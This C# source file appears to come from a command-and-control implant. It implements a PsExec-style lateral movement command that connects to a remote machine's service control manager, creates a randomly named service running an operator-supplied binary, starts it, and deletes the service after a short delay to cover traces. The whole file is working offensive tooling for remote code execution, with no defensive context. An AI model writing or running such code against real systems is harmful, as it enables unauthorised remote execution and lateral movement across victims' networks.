using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Agent.Models;
using Microsoft.Win32.SafeHandles;
using WinAPI.DInvoke;
using WinAPI.Data.AdvApi;
using Shared;

namespace Agent.Commands.Execution
{
    internal class PsExecCommand : AgentCommand
    {
        public override CommandId Command => CommandId.PsExec;
        public override async Task InnerExecute(AgentTask task, AgentCommandContext context, CancellationToken token)
        {

            task.ThrowIfParameterMissing(ParameterId.Path);
            task.ThrowIfParameterMissing(ParameterId.Target);

            string binpath = task.GetParameter<string>(ParameterId.Path);
            string target = task.GetParameter<string>(ParameterId.Target);

            


            var serviceName = ShortGuid.NewGuid();
            var displayName = ShortGuid.NewGuid();
            if (task.HasParameter(ParameterId.Service))
                serviceName = task.GetParameter<string>(ParameterId.Service);

            if (task.HasParameter(ParameterId.Name))
                displayName = task.GetParameter<string>(ParameterId.Name);

            context.AppendResult($"target : {target}");
            context.AppendResult($"binpath : {binpath}");
            context.AppendResult($"service : {serviceName}");

            // open handle to scm
            using (var scmHandle = new SafeServiceHandle(Advapi.OpenSCManager(
                target,
                SCM_ACCESS_RIGHTS.SC_MANAGER_CREATE_SERVICE)))
            {
                if (scmHandle.IsInvalid)
                    throw new Win32Exception(Marshal.GetLastWin32Error());

                // create service
                using (var svcHandle = new SafeServiceHandle(Advapi.CreateService(
                    scmHandle.DangerousGetHandle(),
                    serviceName,
                    displayName,
                    SERVICE_ACCESS_RIGHTS.SERVICE_ALL_ACCESS,
                    SERVICE_TYPE.SERVICE_WIN32_OWN_PROCESS,
                    START_TYPE.SERVICE_DEMAND_START,
                    binpath)))
                {
                    if (svcHandle.IsInvalid)
                        throw new Win32Exception(Marshal.GetLastWin32Error());

                    // start service
                    // this will fail on generic commands, so don't expect a true result
                    Advapi.StartService(svcHandle.DangerousGetHandle());

                    // little sleep
                    await Task.Delay(3000, token);

                    // delete service
                    Advapi.DeleteService(svcHandle.DangerousGetHandle());
                }
            }
        }
    }

    [SecurityCritical]
    internal sealed class SafeServiceHandle : SafeHandleZeroOrMinusOneIsInvalid
    {
        private SafeServiceHandle()
            : base(true)
        {
        }

        public SafeServiceHandle(IntPtr preexistingHandle, bool ownsHandle = true)
            : base(ownsHandle)
        {
            SetHandle(preexistingHandle);
        }

        [SecurityCritical]
        protected override bool ReleaseHandle()
        {
            try
            {
                return Advapi.CloseServiceHandle(handle);
            }
            catch
            {
                return false;
            }
        }
    }
}
